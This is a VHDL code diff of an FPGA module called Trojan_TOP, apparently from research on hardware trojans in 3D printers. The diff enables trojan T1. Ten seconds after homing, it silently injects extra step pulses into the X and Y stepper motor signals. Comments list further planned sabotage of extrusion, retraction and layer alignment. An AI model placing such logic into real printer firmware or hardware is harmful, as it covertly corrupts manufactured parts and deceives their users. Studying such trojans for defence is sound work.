@@ -92,7 +92,7 @@ architecture Behavioral of Trojan_TOP is
     signal E_STEP_COMPLETE : std_logic := '0';
 
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
-    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds or removes steps from X or Y axis during move
+    signal TROJ_T1_ENABLE : std_logic := '1'; -- Adds or removes steps from X or Y axis during move
     signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
     signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
     signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
@@ -132,70 +132,89 @@ begin
     --------------------------- Pulse Gen Test Start ---------------------------
     -- For testing the output of the pulse gen in trojan mode
     -- This part of the code should countinously move the X axis when bypass mode is turned off 
-    -- TODO: Remove this part of the module after test
-    o_X_DIR  <= i_X_DIR;  
-    o_X_EN   <= i_X_EN;   
-    o_X_MIN  <= i_X_MIN;  
-    o_X_STEP <= X_STEP_MOD;
+    -- DONE: I have tested this and confirm the pulse gen works in standalone
+--    o_X_DIR  <= i_X_DIR;  
+--    o_X_EN   <= i_X_EN;   
+--    o_X_MIN  <= i_X_MIN;  
+--    o_X_STEP <= X_STEP_MOD;
 
-    Pulse_Test_proc : process (i_CLK)
-    begin
-        if rising_edge(i_CLK) then
-            X_PULSE_EN <= '1';
-        end if;
-    end process;
+--    Pulse_Test_proc : process (i_CLK)
+--    begin
+--        if rising_edge(i_CLK) then
+--            X_PULSE_EN <= '1';
+--        end if;
+--    end process;
     --------------------------- Pulse Gen Test End ---------------------------
+ 
+
+ 
  
     --------------------------- Trojan 1 Logic Start ---------------------------
     -- This trojan adds or removes steps from the X and Y Axis 
-    
---    o_X_STEP <= i_X_STEP or X_STEP_MOD;
---    o_Y_STEP <= i_Y_STEP or Y_STEP_MOD;
+    -- Rather than using a mux array, we may want buffered outputs which are overwritten per clock
+    o_E0_DIR    <= i_E0_DIR  when TROJ_T1_ENABLE = '0' else i_E0_DIR;
+    o_E0_EN     <= i_E0_EN   when TROJ_T1_ENABLE = '0' else i_E0_EN;
+    o_E0_STEP   <= i_E0_STEP when TROJ_T1_ENABLE = '0' else i_E0_STEP;             
+    o_X_DIR     <= i_X_DIR   when TROJ_T1_ENABLE = '0' else i_X_DIR;
+    o_X_EN      <= i_X_EN    when TROJ_T1_ENABLE = '0' else i_X_EN;    
+    o_X_MIN     <= i_X_MIN   when TROJ_T1_ENABLE = '0' else i_X_MIN;
+    o_X_STEP    <= i_X_STEP  when TROJ_T1_ENABLE = '0' else (i_X_STEP or X_STEP_MOD);                 
+    o_Y_DIR     <= i_Y_DIR   when TROJ_T1_ENABLE = '0' else i_Y_DIR;
+    o_Y_EN      <= i_Y_EN    when TROJ_T1_ENABLE = '0' else i_Y_EN; 
+    o_Y_MIN     <= i_Y_MIN   when TROJ_T1_ENABLE = '0' else i_Y_MIN;
+    o_Y_STEP    <= i_Y_STEP  when TROJ_T1_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);                 
+    o_Z_DIR     <= i_Z_DIR   when TROJ_T1_ENABLE = '0' else i_Z_DIR;
+    o_Z_EN      <= i_Z_EN    when TROJ_T1_ENABLE = '0' else i_Z_EN;
+    o_Z_MIN     <= i_Z_MIN   when TROJ_T1_ENABLE = '0' else i_Z_MIN;             
+    o_Z_STEP    <= i_Z_STEP  when TROJ_T1_ENABLE = '0' else i_Z_STEP;
 
---    trojan_t1_proc : process (i_CLK)
---    begin
---        if rising_edge(i_CLK) then
---            T1_STATE <= T1_NEXT_STATE;
---            case T1_STATE is
---                when IDLE =>
---                    if TROJ_T1_ENABLE = '1' then
---                        T1_NEXT_STATE <= STATE_1;
---                    else
---                        T1_NEXT_STATE <= DISABLE;
---                    end if;
+    trojan_t1_proc : process (i_CLK)
+    begin
+        if rising_edge(i_CLK) then
+            T1_STATE <= T1_NEXT_STATE;
+            case T1_STATE is
+                when IDLE =>
+                    if (TROJ_T1_ENABLE = '1' and homing_complete = '1') then
+                        T1_NEXT_STATE <= STATE_1;
+                    else
+                        T1_NEXT_STATE <= DISABLE;
+                    end if;
 
---                when STATE_1 => -- Counter Enable
---                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
---                        TROJ_T1_COUNTER <= (others=>'0');
---                        T1_NEXT_STATE <= STATE_2;
---                    else 
---                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
---                    end if;
+                when STATE_1 => -- Counter Enable
+                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
+                        TROJ_T1_COUNTER <= (others=>'0');
+                        T1_NEXT_STATE <= STATE_2;
+                    else 
+                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
+                    end if;
 
---                when STATE_2 => -- Send Steps to motor X
---                    if(X_STEP_COMPLETE = '1') then
---                        X_PULSE_EN <= '0';
---                        T1_NEXT_STATE <= STATE_3;
---                    else 
---                        X_PULSE_EN <= '1';
---                    end if;
+                when STATE_2 => -- Send Steps to motor X
+                    if(X_STEP_COMPLETE = '1') then
+                        X_PULSE_EN <= '0';
+                        T1_NEXT_STATE <= STATE_3;
+                    else 
+                        X_PULSE_EN <= '1';
+                    end if;
                         
---                when STATE_3 => -- Send Steps to motor Y
---                    if(Y_STEP_COMPLETE = '1') then
---                        Y_PULSE_EN <= '0';
---                        T1_NEXT_STATE <= IDLE;
---                    else 
---                        Y_PULSE_EN <= '1';
---                    end if;
+                when STATE_3 => -- Send Steps to motor Y
+                    if(Y_STEP_COMPLETE = '1') then
+                        Y_PULSE_EN <= '0';
+                        T1_NEXT_STATE <= IDLE;
+                    else 
+                        Y_PULSE_EN <= '1';
+                    end if;
 
---                when DISABLE => -- Turn off signals here
---                    TROJ_T1_COUNTER <= (others=>'0');
---                    X_PULSE_EN <= '0';
---                    Y_PULSE_EN <= '0';
---                    T1_NEXT_STATE <= IDLE;
---            end case;
---        end if;
---    end process;
+                when STATE_4 => T1_NEXT_STATE <= DISABLE; -- Unused
+                when STATE_5 => T1_NEXT_STATE <= DISABLE; -- Unused
+        
+                when DISABLE => -- Turn off signals here
+                    TROJ_T1_COUNTER <= (others=>'0');
+                    X_PULSE_EN <= '0';
+                    Y_PULSE_EN <= '0';
+                    T1_NEXT_STATE <= IDLE;
+            end case;
+        end if;
+    end process;
 
     --------------------------- Trojan 1 Logic End ---------------------------
 
